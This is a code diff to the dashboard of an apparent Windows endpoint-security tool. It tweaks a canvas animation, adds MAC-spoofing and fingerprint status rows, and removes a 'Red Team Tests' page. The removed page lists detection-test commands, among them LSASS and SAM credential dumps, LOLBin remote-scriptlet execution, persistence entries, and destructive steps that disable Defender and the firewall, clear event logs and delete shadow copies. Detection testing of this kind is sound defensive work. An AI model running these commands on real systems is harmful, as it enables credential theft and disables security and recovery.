@@ -129,20 +129,41 @@ function stateBlock(kind, title, sub) {
 function startParticles() {
   const c = $('particles'); if (!c) return () => {};
   const ctx = c.getContext('2d');
-  let raf, w, h, pts;
-  const resize = () => { w = c.width = c.offsetWidth * devicePixelRatio; h = c.height = c.offsetHeight * devicePixelRatio; };
-  resize(); window.addEventListener('resize', resize);
-  pts = Array.from({ length: 46 }, () => ({
-    x: Math.random() * w, y: Math.random() * h, r: (Math.random() * 1.6 + 0.4) * devicePixelRatio,
-    vy: (-0.15 - Math.random() * 0.35) * devicePixelRatio, vx: (Math.random() - 0.5) * 0.15 * devicePixelRatio,
-    a: Math.random() * 0.5 + 0.1,
+  let raf, w = 1, h = 1;
+  // Keep the canvas BUFFER matched to its on-screen size at all times. Measuring
+  // the element (with a viewport fallback) means we never seed into a partial
+  // layout — the bug that bunched every particle into the top-left corner.
+  const resize = () => {
+    const dpr = window.devicePixelRatio || 1;
+    const cssW = c.offsetWidth || c.clientWidth || window.innerWidth || 1;
+    const cssH = c.offsetHeight || c.clientHeight || window.innerHeight || 1;
+    w = c.width = Math.max(1, Math.round(cssW * dpr));
+    h = c.height = Math.max(1, Math.round(cssH * dpr));
+  };
+  resize();
+  window.addEventListener('resize', resize);
+  // Density from the viewport (always known), not a maybe-unlaid-out canvas.
+  const area = (window.innerWidth || 1440) * (window.innerHeight || 900);
+  const count = Math.max(150, Math.min(340, Math.round(area / 9000)));
+  // Positions are stored as FRACTIONS of the canvas (0..1). Multiplying by the
+  // live width/height at draw time guarantees the field ALWAYS fills the whole
+  // screen — independent of size, DPR, or when a resize lands.
+  const pts = Array.from({ length: count }, () => ({
+    fx: Math.random(), fy: Math.random(),
+    r: Math.random() * 1.7 + 0.4,            // css px; scaled by dpr at draw
+    vx: (Math.random() - 0.5) * 0.00022,     // fraction of width  / frame
+    vy: -(0.00022 + Math.random() * 0.00060),// fraction of height / frame (up)
+    a: Math.random() * 0.5 + 0.12,
   }));
   const draw = () => {
+    const dpr = window.devicePixelRatio || 1;
     ctx.clearRect(0, 0, w, h);
     for (const p of pts) {
-      p.x += p.vx; p.y += p.vy;
-      if (p.y < -10) { p.y = h + 10; p.x = Math.random() * w; }
-      ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+      p.fx += p.vx; p.fy += p.vy;
+      if (p.fy < -0.02) { p.fy = 1.02; p.fx = Math.random(); }   // wrap top→bottom
+      if (p.fx < -0.02) p.fx = 1.02; else if (p.fx > 1.02) p.fx = -0.02;
+      ctx.beginPath();
+      ctx.arc(p.fx * w, p.fy * h, p.r * dpr, 0, Math.PI * 2);
       ctx.fillStyle = `rgba(235,235,240,${p.a})`; ctx.fill();
     }
     raf = requestAnimationFrame(draw);
@@ -252,7 +273,6 @@ const NAV = [
   ['dashboard', 'Dashboard', 'dashboard'], ['protection', 'Protection', 'shield'],
   ['privacy', 'Privacy', 'lock'], ['firewall', 'Firewall', 'flame'],
   ['threats', 'Threats', 'alert'], ['hunting', 'Threat Hunting', 'search'],
-  ['redteam', 'Red Team Tests', 'target'],
   ['intelligence', 'Intelligence', 'brain'],
   ['applications', 'Applications', 'apps'], ['network', 'Network', 'network'],
   ['dns', 'DNS', 'dns'], ['devices', 'Devices', 'devices'],
@@ -435,15 +455,33 @@ PAGES.privacy = {
     const box = $('privRows'); if (!box) return;
     const vs = ViewState.privacyRowsState(state.engineUp);
     if (vs.kind !== 'list') { box.innerHTML = stateBlock(vs.kind, vs.title, vs.sub); return; }
-    const [tel, vpn, zero] = await Promise.all([
+    const [tel, vpn, zero, mac, fp] = await Promise.all([
       safe(() => V.api.get('/api/telemetry/status'), {}),
       safe(() => V.api.get('/api/vpn/status'), {}),
       safe(() => V.api.get('/api/zero-log/status'), {}),
+      safe(() => V.api.get('/api/mac/status'), {}),
+      safe(() => V.api.get('/api/fingerprint/status'), {}),
     ]);
     const telStatus = tel.status === 'KILLED' ? badge('Killed', 'ok')
       : tel.status === 'ACTIVE' ? badge('Telemetry active', 'warn')
       : tel.status === 'PARTIAL' ? badge('Partial', 'warn') : badge('Unknown', 'off');
+    // MAC identity — show original → current (spoofed) for the adapter that changed.
+    const ifaces = (mac && mac.interfaces) || {};
+    let m = null, mName = '';
+    for (const [name, v] of Object.entries(ifaces)) {
+      if (v && v.changed) { m = v; mName = name; break; }
+      if (!m && v && v.current) { m = v; mName = name; }
+    }
+    const monoOld = 'font-family:ui-monospace,monospace;opacity:.55';
+    const monoNew = 'font-family:ui-monospace,monospace';
+    const macCell = m && m.changed
+      ? `<span style="${monoOld}">${m.original}</span> <span style="opacity:.5">→</span> <span style="${monoNew}">${m.current}</span>`
+      : (m ? `<span style="${monoNew}">${m.current || '—'}</span> ${badge('original', 'off')}` : badge('—', 'off'));
+    const fpCell = (fp && fp.normalized) ? badge('Spoofed (generic · TTL 64)', 'ok')
+      : (fp && fp.supported ? badge('Real (Windows stack)', 'off') : badge('—', 'off'));
     box.innerHTML = rowsPanel([
+      ['MAC identity' + (mName ? ' (' + mName + ')' : ''), macCell, 'network'],
+      ['TCP/IP fingerprint', fpCell, 'activity'],
       ['Windows telemetry', telStatus, 'shield'],
       ['Telemetry settings tracked', fmt((tel.settings || []).length), 'activity'],
       ['Encrypted transport (VPN)', vpn.hop1_conf_exists ? badge('Configured', 'ok') : badge('Not configured', 'off'), 'globe'],
@@ -718,173 +756,6 @@ PAGES.hunting = {
   },
 };
 
-/* ---- Red Team Tests ---- */
-// Copy-paste MITRE ATT&CK techniques so a locked-down VM with nothing
-// installed can test detection: no script file, no download, no Atomic Red
-// Team — one command at a time, straight into an elevated PowerShell. Same
-// technique set as redteam/native_redteam.ps1, rewritten as self-contained
-// one-liners (no $stage/Exec helpers to carry over).
-const REDTEAM_VERIFY = [
-  { name: 'Check Valkyrie is up',
-    cmd: `(Invoke-WebRequest "http://127.0.0.1:8090/api/health" -UseBasicParsing).Content` },
-  { name: 'List detected incidents (run this after a technique below)',
-    cmd: `(Invoke-WebRequest "http://127.0.0.1:8090/api/edr/incidents" -UseBasicParsing).Content` },
-];
-const REDTEAM_GROUPS = [
-  { tactic: 'Execution', items: [
-    { id: 'T1059.001', name: 'Encoded PowerShell (hidden window)',
-      cmd: `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand ([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Get-Process | Out-Null')))`,
-      note: 'Hidden window + base64 payload — a classic LOLBin execution flag.' },
-    { id: 'T1059.003', name: 'cmd spawned chain',
-      cmd: `cmd.exe /c "echo hi & whoami & hostname"`,
-      note: 'Multiple commands chained through cmd.exe in one call.' },
-    { id: 'T1218.011', name: 'rundll32 proxy execution',
-      cmd: `rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)`,
-      note: 'rundll32 running inline script instead of a real DLL export.' },
-    { id: 'T1218.010', name: 'regsvr32 Squiblydoo',
-      cmd: `regsvr32.exe /s /u /i:http://127.0.0.1:1/x.sct scrobj.dll`,
-      note: 'Signed binary proxy execution loading a remote scriptlet.' },
-    { id: 'T1218.005', name: 'mshta remote scriptlet',
-      cmd: `mshta.exe http://127.0.0.1:1/x.hta`,
-      note: 'mshta opens a URL instead of a local .hta — an error window popping up is normal, nothing is listening there.' },
-    { id: 'T1047', name: 'WMI process create',
-      cmd: `Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="calc.exe"}`,
-      cleanup: `Get-Process calc -EA SilentlyContinue | Stop-Process -Force`,
-      note: 'Launches calc.exe via WMI instead of a normal parent process.' },
-  ]},
-  { tactic: 'Persistence', items: [
-    { id: 'T1053.005', name: 'Scheduled task (on logon)',
-      cmd: `schtasks /create /tn ValkRT_Task /tr "C:\\Windows\\System32\\calc.exe" /sc onlogon /f`,
-      cleanup: `schtasks /delete /tn ValkRT_Task /f`,
-      note: 'Creates a logon-triggered scheduled task.' },
-    { id: 'T1547.001', name: 'Registry Run key',
-      cmd: `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v ValkRT /t REG_SZ /d "C:\\Windows\\System32\\calc.exe" /f`,
-      cleanup: `reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v ValkRT /f`,
-      note: 'Classic autostart registry persistence.' },
-    { id: 'T1547.001b', name: 'Startup-folder drop',
-      cmd: `"start calc.exe" | Out-File "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ValkRT.bat" -Encoding ascii`,
-      cleanup: `Remove-Item "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ValkRT.bat"`,
-      note: 'Drops a launcher directly into the Startup folder.' },
-    { id: 'T1543.003', name: 'Windows service create', admin: true,
-      cmd: `sc.exe create ValkRTSvc binPath= "C:\\Windows\\System32\\calc.exe" start= demand`,
-      cleanup: `sc.exe delete ValkRTSvc`,
-      note: 'Registers a new service pointing at calc.exe.' },
-  ]},
-  { tactic: 'Defense Evasion', items: [
-    { id: 'T1027', name: 'Obfuscated / encoded command',
-      cmd: `powershell.exe -nop -w hidden -EncodedCommand ([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX 'Write-Output evil'")))`,
-      note: 'Base64-encoded IEX — a textbook obfuscation pattern.' },
-    { id: 'T1140', name: 'certutil decode payload',
-      cmd: `[Convert]::ToBase64String((1..32)) | Out-File "$env:TEMP\\p.b64" -Encoding ascii; certutil -decode "$env:TEMP\\p.b64" "$env:TEMP\\p.bin"`,
-      note: 'A living-off-the-land binary used to decode a "payload".' },
-  ]},
-  { tactic: 'Credential Access', items: [
-    { id: 'T1003.001', name: 'LSASS dump via comsvcs', admin: true,
-      cmd: `rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id "$env:TEMP\\lsass.dmp" full`,
-      cleanup: `Remove-Item "$env:TEMP\\lsass.dmp" -ErrorAction SilentlyContinue`,
-      note: 'The Mimikatz-free credential-dump trick every red team knows.' },
-    { id: 'T1003.002', name: 'SAM hive dump', admin: true,
-      cmd: `reg save HKLM\\SAM "$env:TEMP\\sam.save" /y`,
-      cleanup: `Remove-Item "$env:TEMP\\sam.save" -ErrorAction SilentlyContinue`,
-      note: 'Saves the SAM registry hive to disk for offline cracking.' },
-  ]},
-  { tactic: 'Discovery', items: [
-    { id: 'T1033', name: 'whoami /priv', cmd: `whoami /priv`, note: "Enumerates the current token's privileges." },
-    { id: 'T1082', name: 'systeminfo', cmd: `systeminfo`, note: 'Full OS/hardware fingerprint.' },
-    { id: 'T1057', name: 'tasklist /v', cmd: `tasklist /v`, note: 'Enumerates running processes.' },
-    { id: 'T1087.001', name: 'local accounts', cmd: `net user`, note: 'Lists local user accounts.' },
-    { id: 'T1016', name: 'network config', cmd: `ipconfig /all`, note: 'Full network configuration.' },
-    { id: 'T1049', name: 'network connections', cmd: `netstat -ano`, note: 'Enumerates active connections.' },
-    { id: 'T1018', name: 'remote system recon', cmd: `net view & net group`, note: 'Enumerates other machines and domain groups.' },
-    { id: 'T1482', name: 'domain trust recon', cmd: `nltest /domain_trusts`, note: 'Enumerates domain trust relationships.' },
-  ]},
-  { tactic: 'Command and Control', items: [
-    { id: 'T1105', name: 'certutil download',
-      cmd: `certutil -urlcache -split -f http://127.0.0.1:1/x.txt "$env:TEMP\\x.txt"`,
-      cleanup: `Remove-Item "$env:TEMP\\x.txt" -ErrorAction SilentlyContinue`,
-      note: 'A LOLBin used to fetch a remote file.' },
-    { id: 'T1071.004', name: 'suspicious DNS lookup', cmd: `nslookup malware-c2-test.example.com`,
-      note: 'A DNS query with an obviously malicious-looking name.' },
-  ]},
-  { tactic: 'Lateral Movement', items: [
-    { id: 'T1021.002', name: 'SMB admin-share reach',
-      cmd: `net use \\\\127.0.0.1\\C$ /persistent:no`,
-      cleanup: `net use \\\\127.0.0.1\\C$ /delete`,
-      note: 'Connects to an administrative share.' },
-  ]},
-];
-const REDTEAM_DESTRUCTIVE = [
-  { tactic: 'Impact / Defense Evasion — DESTRUCTIVE', items: [
-    { id: 'T1489', name: 'Stop a service', admin: true, cmd: `net stop Spooler`,
-      cleanup: `net start Spooler`, note: 'Stops the Print Spooler service.' },
-    { id: 'T1562.004', name: 'Disable Windows Firewall', admin: true,
-      cmd: `netsh advfirewall set allprofiles state off`,
-      cleanup: `netsh advfirewall set allprofiles state on`, note: 'Turns off the firewall on all profiles.' },
-    { id: 'T1562.001', name: 'Disable Defender realtime', admin: true,
-      cmd: `Set-MpPreference -DisableRealtimeMonitoring $true`,
-      cleanup: `Set-MpPreference -DisableRealtimeMonitoring $false`, note: 'Disables Windows Defender real-time protection.' },
-    { id: 'T1070.001', name: 'Clear an event log', admin: true,
-      cmd: `wevtutil cl "Windows PowerShell"`, note: 'Clears the PowerShell event log — irreversible.' },
-    { id: 'T1490', name: 'Delete shadow copies', admin: true,
-      cmd: `vssadmin delete shadows /all /quiet`, note: 'Deletes all volume shadow copies — irreversible, ransomware-style.' },
-  ]},
-];
-function rtCopyBtn(text) {
-  return `<button class="btn rt-copy" data-copy="${escapeHtml(text)}">${ICON.download}<span>Copy</span></button>`;
-}
-function rtRow(item) {
-  return `<div class="rt-item">
-    <div class="rt-head">
-      ${item.id ? `<span class="mono-tag">${escapeHtml(item.id)}</span>` : ''}
-      <span class="rt-name">${escapeHtml(item.name)}</span>
-      ${item.admin ? badge('Admin required', 'warn') : ''}
-    </div>
-    ${item.note ? `<div class="rt-note">${escapeHtml(item.note)}</div>` : ''}
-    <div class="rt-cmd"><code>${escapeHtml(item.cmd)}</code>${rtCopyBtn(item.cmd)}</div>
-    ${item.cleanup ? `<div class="rt-cmd rt-cleanup">
-      <span class="rt-cleanup-label">Cleanup</span>
-      <code>${escapeHtml(item.cleanup)}</code>${rtCopyBtn(item.cleanup)}
-    </div>` : ''}
-  </div>`;
-}
-function rtGroup(g) {
-  const all = g.items.map((i) => i.cmd).join('\n');
-  return `${sectionHead(g.tactic)}
-    <div class="rt-group-actions">${rtCopyBtn(all).replace('>Copy<', `>Copy all (${g.items.length})<`)}</div>
-    <div class="rt-list">${g.items.map(rtRow).join('')}</div>`;
-}
-function bindRtCopyButtons(root) {
-  root.querySelectorAll('.rt-copy').forEach((b) => {
-    b.onclick = async () => {
-      try { await navigator.clipboard.writeText(b.dataset.copy); toast('Command copied.', 'ok'); }
-      catch { toast('Could not access the clipboard.', 'error'); }
-    };
-  });
-}
-PAGES.redteam = {
-  showDestructive: false,
-  render() {
-    $('page').innerHTML = `
-      <div class="page-intro">Copy-paste MITRE ATT&amp;CK techniques to test Valkyrie's detection — nothing to
-      download, no script file, just tools already on Windows. Paste one command into an elevated PowerShell,
-      wait a few seconds, then check <b>Threats</b> or run the incidents check below to see whether it was caught.</div>
-      ${sectionHead('Verify Detection')}
-      <div class="rt-list" id="rtVerify"></div>
-      ${sectionHead('Safe Techniques', 'nothing here damages the VM')}
-      <div id="rtSafe"></div>
-      <div class="rt-destructive-toggle">
-        <label class="rt-check"><input type="checkbox" id="rtShowDestructive" ${this.showDestructive ? 'checked' : ''}>
-          Show destructive techniques (disables Defender/firewall, deletes shadow copies — snapshot the VM first)</label>
-      </div>
-      <div id="rtDestructive" ${this.showDestructive ? '' : 'hidden'}></div>`;
-    $('rtVerify').innerHTML = REDTEAM_VERIFY.map(rtRow).join('');
-    $('rtSafe').innerHTML = REDTEAM_GROUPS.map(rtGroup).join('');
-    $('rtDestructive').innerHTML = REDTEAM_DESTRUCTIVE.map(rtGroup).join('');
-    bindRtCopyButtons($('page'));
-    const cb = $('rtShowDestructive');
-    cb.onchange = () => { this.showDestructive = cb.checked; $('rtDestructive').hidden = !cb.checked; };
-  },
-};
 
 /* ---- Intelligence ---- */
 PAGES.intelligence = {
